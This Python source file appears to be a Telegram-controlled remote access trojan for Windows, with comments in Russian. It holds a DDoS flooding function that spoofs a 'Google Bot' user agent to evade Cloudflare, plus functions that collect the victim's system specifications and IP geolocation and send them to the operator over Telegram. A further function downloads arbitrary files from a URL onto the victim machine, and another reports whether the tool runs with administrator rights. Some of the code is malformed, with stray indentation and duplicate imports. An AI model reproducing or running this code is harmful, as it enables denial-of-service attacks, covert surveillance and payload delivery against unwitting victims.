# -*- coding: utf8 -*-
import os
import platform
import subprocess
import threading
import requests
import pyautogui
import keyboard
import telebot
import json as jsn
import datetime
import argparse
import ctypes
import platform

    def ddos(bot, white_list_id, url):
        # Устанавливаем headers Google бота, для обхода Cloudflare
        headers = {"User-Agent": "Google Bot"}

        if 'http' in url and '.' in url:
            # Отправляем сообщение о начале DDOS атаки
            bot.send_message(white_list_id, f'DDOS атака на {url} успешно запущена')
        else:
            bot.send_message(white_list_id, f'Ошибка: неверный url, проверьте правильность введенных данных')

        while True:
            try:
                # Отправляем GET запрос с данными
                requests.get(url, headers=headers, allow_redirects=True, stream=True)
            except Exception:
                pass

    def specifications(self, white_list_id, bot):
        """
        Получение спецификаций компьютера
        """
        list_vid = os.popen(r"wmic path win32_VideoController get name").read().split('\n')[2].strip()
        ram = os.popen(r"wmic OS get FreePhysicalMemory").read().split("\n")[2].strip() + " MB"
        x, y = pyautogui.size()
        banner = f"""Имя ПК:   {platform.node()}\n
        ОС: {platform.system()} {platform.release()}\n
        Разрядность: {platform.architecture()[0]}\n
        CPU: {platform.processor()}\n
        GPU: {list_vid}\n
        RAM: {ram}\n
        Разрешение: {x}x{y}"""
        bot.send_message(white_list_id, banner)

    def ip_address(white_list_id, bot):
        """
        Получение информации об IP-адресе
        """
        try:
            # Получение IP-адреса через jsonip.com
            ip = requests.get("http://jsonip.com/").json()
            # Получение информации об IP-адресе через ip-api.com
            response = requests.get(url=f'http://ip-api.com/json/{ip["ip"]}').json()

            # Создание словаря с информацией об IP-адресе
            data = {
                '[IP]': response.get('query'),
                '[Провайдер]': response.get('isp'),
                '[Организация]': response.get('org'),
                '[Страна]': response.get('country'),
                '[Регион]': response.get('regionName'),
                '[Город]': response.get('city'),
                '[ZIP]': response.get('zip'),
                '[Широта]': response.get('lat'),
                '[Долгота]': response.get('lon'),
            }

            # Формирование строки с информацией об IP-адресе
            info_string = ""
            for k, v in data.items():
                info_string += f'{k} : {v}\n'

            # Отправка строки с информацией об IP-адресе
            bot.send_message(white_list_id, info_string)
        except requests.exceptions.ConnectionError:
            bot.send_message(white_list_id, 'Ошибка соединения')

    def wgt(white_list_id, text_comand, bot):
        """
        Загрузка файла с указанного URL
        """
        try:
            # Загрузка файла с указанного URL через библиотеку requests
            file = requests.get(text_comand[0])
            # Сохранение файла в указанное место
            with open(text_comand[1], 'wb') as f:
                f.write(file.content)
            bot.send_message(white_list_id, "🖥✅")
        except Exception:
            bot.send_message(white_list_id, 'Ошибка')

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


class Func_API:
    def __init__(self) -> None:
        for ids in white_list_id:
            try:
                if is_admin():
                    bot.send_message(ids, f'{name_pc} запущен от имени администратора')
                else:
                    bot.send_message(ids, f'{name_pc} запущен от имени обычного пользователя')
            except Exception:
                pyautogui.alert("Вы указали неверный токен")